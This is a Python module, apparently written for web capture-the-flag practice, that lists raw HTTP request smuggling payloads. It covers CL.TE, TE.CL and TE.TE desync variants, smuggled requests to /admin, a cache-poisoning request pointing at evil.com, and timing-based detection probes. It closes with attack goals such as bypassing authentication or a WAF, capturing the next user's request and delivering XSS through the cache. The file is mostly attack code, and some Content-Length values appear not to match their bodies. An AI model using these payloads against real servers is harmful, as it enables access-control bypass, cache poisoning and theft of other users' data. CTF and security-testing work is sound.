"""
HTTP Request Smuggling Payload Crafter for Web CTF.
Covers CL.TE, TE.CL, TE.TE smuggling techniques, and cache poisoning via smuggling.
"""

from typing import List, Dict


def get_request_smuggling_payloads() -> List[Dict[str, str]]:
    """Generate HTTP request smuggling payloads."""
    return [
        {
            "name": "CL.TE (Content-Length then Transfer-Encoding)",
            "payload": """POST / HTTP/1.1
Host: target.com
Content-Length: 4
Transfer-Encoding: chunked

1
A
0

""",
            "desc": "Front-end uses Content-Length, back-end uses Transfer-Encoding (chunked)."
        },
        {
            "name": "TE.CL (Transfer-Encoding then Content-Length)",
            "payload": """POST / HTTP/1.1
Host: target.com
Content-Length: 3
Transfer-Encoding: chunked

0

G""",
            "desc": "Front-end uses Transfer-Encoding, back-end uses Content-Length."
        },
        {
            "name": "TE.TE (Obfuscated Transfer-Encoding)",
            "payload": """POST / HTTP/1.1
Host: target.com
Content-Length: 4
Transfer-Encoding: chunked
Transfer-Encoding: xchunked

1
A
0

""",
            "desc": "Obfuscated Transfer-Encoding header to confuse one server."
        },
        {
            "name": "CL.TE with Smuggled Request",
            "payload": """POST / HTTP/1.1
Host: target.com
Content-Length: 13
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
Host: target.com

""",
            "desc": "Smuggles a second request (GET /admin) to the back-end."
        },
        {
            "name": "TE.CL with Smuggled Request",
            "payload": """POST / HTTP/1.1
Host: target.com
Content-Length: 4
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
Host: target.com

""",
            "desc": "Smuggles a second request via TE.CL confusion."
        },
        {
            "name": "CL.TE Cache Poisoning",
            "payload": """POST / HTTP/1.1
Host: target.com
Content-Length: 4
Transfer-Encoding: chunked

0

GET /poison HTTP/1.1
Host: evil.com

""",
            "desc": "Smuggles a request that poisons the cache with malicious content."
        }
    ]


def get_smuggling_detection_payloads() -> List[Dict[str, str]]:
    """Generate payloads to detect request smuggling vulnerabilities."""
    return [
        {
            "name": "CL.TE Detection (Timing)",
            "payload": """POST / HTTP/1.1
Host: target.com
Content-Length: 4
Transfer-Encoding: chunked

1
A
0

""",
            "desc": "If response is delayed or error, CL.TE may be present."
        },
        {
            "name": "TE.CL Detection (Timing)",
            "payload": """POST / HTTP/1.1
Host: target.com
Content-Length: 3
Transfer-Encoding: chunked

0

G""",
            "desc": "If response is delayed or error, TE.CL may be present."
        },
        {
            "name": "CL.TE Detection (Response Confusion)",
            "payload": """POST / HTTP/1.1
Host: target.com
Content-Length: 6
Transfer-Encoding: chunked

0

X""",
            "desc": "Sends a request that causes the next response to be confused."
        }
    ]


def get_smuggling_attack_vectors() -> List[Dict[str, str]]:
    """Generate request smuggling attack vectors."""
    return [
        {
            "name": "Request Smuggling to Bypass Auth",
            "payload": "Smuggle a request to /admin without auth headers",
            "desc": "Smuggled requests may bypass front-end authentication."
        },
        {
            "name": "Request Smuggling to Poison Cache",
            "payload": "Smuggle a request that poisons the cache with malicious content",
            "desc": "Cache poisoning via smuggled request affects other users."
        },
        {
            "name": "Request Smuggling to Steal Data",
            "payload": "Smuggle a request that captures the next user's request",
            "desc": "Smuggled request can capture other users' sensitive data."
        },
        {
            "name": "Request Smuggling to Bypass WAF",
            "payload": "Smuggle a request that bypasses the WAF",
            "desc": "Smuggled requests may bypass WAF inspection."
        },
        {
            "name": "Request Smuggling to XSS",
            "payload": "Smuggle a request that reflects XSS to other users",
            "desc": "Smuggled request can deliver XSS to other users via cache."
        }
    ]
